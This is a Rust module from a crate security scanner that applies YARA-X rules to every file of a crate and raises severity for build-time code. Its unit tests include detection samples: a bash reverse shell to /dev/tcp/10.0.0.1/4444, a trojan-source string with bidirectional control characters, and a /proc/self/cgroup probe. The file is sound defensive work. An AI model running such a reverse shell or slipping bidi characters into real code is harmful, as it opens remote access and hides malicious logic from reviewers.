//! YARA-X rules over every file of a crate.
//!
//! The built in rules (`rules/crateward.yar`) complement the syn based
//! analysis: they see bytes in any file, including data files and binaries
//! that no Rust parser looks at. Each rule's `severity` metadata becomes the
//! finding's severity; code that runs at build time raises it one level.

use yara_x::errors::CompileError;

use crate::findings::{CodeContext, Finding, FindingKind, Platform, Severity, evidence};

/// The built in rule source.
pub const BUILTIN_RULES: &str = include_str!("../rules/crateward.yar");

/// Compiled rules.
pub struct Rules(yara_x::Rules);

impl std::fmt::Debug for Rules {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str("Rules")
    }
}

fn severity(text: &str) -> Severity {
    match text {
        "high" => Severity::High,
        "medium" => Severity::Medium,
        "low" => Severity::Low,
        _ => Severity::Info,
    }
}

/// Extensions of files that a compiler, interpreter or shell reads as code.
const SOURCE_EXTENSIONS: &[&str] = &[
    "rs", "toml", "c", "cc", "cpp", "cxx", "h", "hh", "hpp", "s", "asm", "py", "sh", "bash", "zsh",
    "ps1", "psm1", "bat", "cmd", "js", "mjs", "cjs", "ts", "go", "rb", "pl", "lua", "cmake", "mk",
    "in", "ac", "am", "m4", "ld", "x", "lds",
];

/// Whether a path names a source file, by extension or well known name.
fn is_source(file: &str) -> bool {
    let name = file.rsplit('/').next().unwrap_or(file);
    match name.rsplit_once('.') {
        Some((_, ext)) => SOURCE_EXTENSIONS
            .iter()
            .any(|e| ext.eq_ignore_ascii_case(e)),
        None => matches!(
            name,
            "Makefile" | "makefile" | "GNUmakefile" | "configure" | "Kconfig"
        ),
    }
}

impl Rules {
    /// Compiles the built in rules.
    ///
    /// # Errors
    ///
    /// Fails if the rules do not compile; a unit test guarantees they do.
    pub fn builtin() -> Result<Self, CompileError> {
        yara_x::compile(BUILTIN_RULES).map(Self)
    }

    /// Scans one file and returns a finding per matching rule.
    #[must_use]
    pub fn scan(&self, file: &str, data: &[u8], context: CodeContext) -> Vec<Finding> {
        let source = is_source(file);
        let mut scanner = yara_x::Scanner::new(&self.0);
        let Ok(results) = scanner.scan(data) else {
            return Vec::new();
        };
        results
            .matching_rules()
            .filter_map(|rule| {
                let mut base = Severity::Info;
                let mut description = String::new();
                for (key, value) in rule.metadata() {
                    match (key, value) {
                        ("severity", yara_x::MetaValue::String(text)) => base = severity(text),
                        ("description", yara_x::MetaValue::String(text)) => {
                            description = text.to_owned();
                        }
                        ("source_only", yara_x::MetaValue::Bool(true)) if !source => return None,
                        _ => {}
                    }
                }
                Some(Finding {
                    kind: FindingKind::YaraMatch {
                        rule: rule.identifier().to_owned(),
                    },
                    severity: if context.runs_at_build_time() {
                        base.raised()
                    } else {
                        base
                    },
                    file: file.to_owned(),
                    line: first_line(data, &rule),
                    context,
                    cfg: None,
                    platform: Platform::Any,
                    evidence: evidence(&description),
                })
            })
            .collect()
    }
}

/// The line of the rule's first match, for files that are text.
fn first_line(data: &[u8], rule: &yara_x::Rule<'_, '_>) -> Option<u32> {
    std::str::from_utf8(data).ok()?;
    let offset = rule
        .patterns()
        .flat_map(|p| p.matches())
        .map(|m| m.range().start)
        .min()?;
    let breaks = data.get(..offset)?.iter().filter(|&&b| b == b'\n').count();
    u32::try_from(breaks + 1).ok()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rules_matching(data: &[u8]) -> Vec<String> {
        let rules = Rules::builtin().unwrap();
        rules
            .scan("src/lib.rs", data, CodeContext::Library)
            .into_iter()
            .map(|f| match f.kind {
                FindingKind::YaraMatch { rule } => rule,
                _ => String::new(),
            })
            .collect()
    }

    #[test]
    fn the_builtin_rules_compile() {
        Rules::builtin().unwrap();
    }

    #[test]
    fn trojan_source_and_embedded_binaries_match() {
        assert_eq!(
            rules_matching("let admin = \"user\u{202E} \u{2066}// check\";".as_bytes()),
            vec!["bidi_control_characters"]
        );
        let mut elf = vec![0x7F, b'E', b'L', b'F'];
        elf.extend([0_u8; 60]);
        assert_eq!(rules_matching(&elf), vec!["embedded_elf_executable"]);
        assert!(
            rules_matching(b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
                .contains(&"reverse_shell".to_owned())
        );
    }

    #[test]
    fn source_only_rules_skip_data_files() {
        let rules = Rules::builtin().unwrap();
        let bidi = "x\u{202E}y".as_bytes();
        assert!(
            rules
                .scan("assets/cat.gif", bidi, CodeContext::Library)
                .is_empty()
        );
        assert_eq!(
            rules.scan("src/lib.rs", bidi, CodeContext::Library).len(),
            1
        );
        assert_eq!(rules.scan("Makefile", bidi, CodeContext::Library).len(), 1);
    }

    #[test]
    fn matches_in_text_files_have_a_line() {
        let rules = Rules::builtin().unwrap();
        let source = b"fn main() {\n    // probe\n    std::fs::read(\"/proc/self/cgroup\");\n}\n";
        let found = rules.scan("build.rs", source, CodeContext::BuildScript);
        assert_eq!(found[0].line, Some(3));
        let mut elf = vec![0x7F, b'E', b'L', b'F', 0xFF];
        elf.extend([0_u8; 60]);
        let found = rules.scan("lib.so", &elf, CodeContext::Library);
        assert_eq!(found[0].line, None);
    }

    #[test]
    fn ordinary_source_matches_nothing() {
        assert!(rules_matching(b"fn main() { println!(\"hello\"); }").is_empty());
    }

    #[test]
    fn build_scripts_raise_the_rule_severity() {
        let rules = Rules::builtin().unwrap();
        let findings = rules.scan(
            "build.rs",
            b"std::fs::read(\"/proc/self/cgroup\")",
            CodeContext::BuildScript,
        );
        assert_eq!(findings[0].severity, Severity::High);
    }
}
